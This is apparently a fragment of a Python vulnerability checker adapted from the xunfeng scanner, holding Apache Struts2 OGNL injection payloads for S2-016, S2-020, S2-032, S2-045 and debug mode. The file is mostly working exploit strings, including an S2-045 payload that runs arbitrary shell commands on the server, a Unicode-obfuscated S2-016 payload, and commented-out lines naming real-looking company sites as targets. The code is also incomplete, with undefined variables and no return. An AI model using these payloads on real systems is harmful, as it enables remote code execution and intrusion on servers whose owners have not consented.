import random 
import hashlib


def check():
    rand_num = random.randint(0, 100000)
    hash_flag = hashlib.md5(str(rand_num)).hexdigest()

    # improved (from https://github.com/ysrc/xunfeng)
    flag_list = {
        "S2_016": {
            "poc": {
                "para": ["redirect:${%23out%3D%23\u0063\u006f\u006e\u0074\u0065\u0078\u0074.\u0067\u0065\u0074(new \u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0053\u0074\u0072\u0069\u006e\u0067(\u006e\u0065\u0077\u0020\u0062\u0079\u0074\u0065[]{99,111,109,46,111,112,101,110,115,121,109,112,104,111,110,121,46,120,119,111,114,107,50,46,100,105,115,112,97,116,99,104,101,114,46,72,116,116,112,83,101,114,118,108,101,116,82,101,115,112,111,110,115,101})).\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072(),%23\u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e(\u006e\u0065\u0077\u0020\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0053\u0074\u0072\u0069\u006e\u0067(\u006e\u0065\u0077\u0020\u0062\u0079\u0074\u0065[]{46,46,81,116,101,115,116,81,46,46})),%23\u0072\u0065\u0064\u0069\u0072\u0065\u0063\u0074,%23\u006f\u0075\u0074\u002e\u0063\u006c\u006f\u0073\u0065()}"],
                "key": "QtestQ"
                },
            "exp":""
        },

        "S2_020": {
            "poc": {
                    "para":["class[%27classLoader%27][%27jarPath%27]=1024", "class[%27classLoader%27][%27resources%27]=1024"],
                    "key": "No result defined for action"
                    },
            "exp":""
        },

        "S2_DEBUG": {
            "poc": { 
                "para":["debug=command&expression=%23f%3d%23_memberAccess.getClass().getDeclaredField(%27allowStaticM%27%2b%27ethodAccess%27),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),%23o%3d@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23o.println(%27[%27%2b%27ok%27%2b%27]%27),%23o.close()"],
                "key": "[ok]"
                },
            "exp":""
        },

        "S2_017_URL": {
            "poc": {
                "para":["redirect:http://360.cn/", "redirectAction:http://360.cn/%23"],
                "key": "http://www.360.cn/favicon.ico"
                },
            "exp":""
        },

        "S2_032": {
            "poc": {
                "para":["method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23w%3d%23context.get(%23parameters.rpsobj[0]),%23w.getWriter().println(66666666-2),%23w.getWriter().flush(),%23w.getWriter().close(),1?%23xx:%23request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse"],
                "key": "66666664"
                },
            "exp":""
        },

        "S2_045": {
            "poc": {
                # "para":["%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('['+'xunfeng'+']')).(#o.close())}"],
                "para":["%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('" + hash_flag + "']')).(#o.close())}"],
                "key": hash_flag},
            "exp":"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+ cmd +"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        }
    }

    # url = 'http://www.powerlong.com/news/news!load.action'
    # url = 'http://www.zzidc.com/index.action'
    # header["Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#iswin?(#cmd='" + win + "'):(#cmd='" + linux + "')).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
